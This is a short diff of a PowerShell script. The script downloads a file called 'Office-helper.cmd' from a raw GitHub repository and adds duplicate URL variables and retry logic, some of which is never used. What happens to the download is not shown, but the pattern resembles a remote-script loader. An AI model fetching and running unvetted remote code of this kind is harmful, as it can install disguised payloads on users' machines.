@@ -6,13 +6,23 @@ $ErrorActionPreference = "Stop"
 
 $CommonURLPart = 'Office-helper.cmd'
 $DownloadURL1 = 'https://raw.githubusercontent.com/BL4ckCloud/abahzian/main/' + $CommonURLPart
+$DownloadURL2 = 'https://raw.githubusercontent.com/BL4ckCloud/abahzian/main/' + $CommonURLPart
+$DownloadURL3 = 'https://raw.githubusercontent.com/BL4ckCloud/abahzian/main/' + $CommonURLPart
 
-$URLs = @($DownloadURL1)
+$URLs = @($DownloadURL1, $DownloadURL2)
 $RandomURL1 = Get-Random -InputObject $URLs
+$RandomURL2 = $URLs -notmatch $RandomURL1 | Get-Random
 
 try {
     $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
-
+}
+catch {
+    try {
+        $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
+    }
+    catch {
+        $response = Invoke-WebRequest -Uri $DownloadURL1 -UseBasicParsing
+    }
 }
 
 $rand = Get-Random -Maximum 99999999
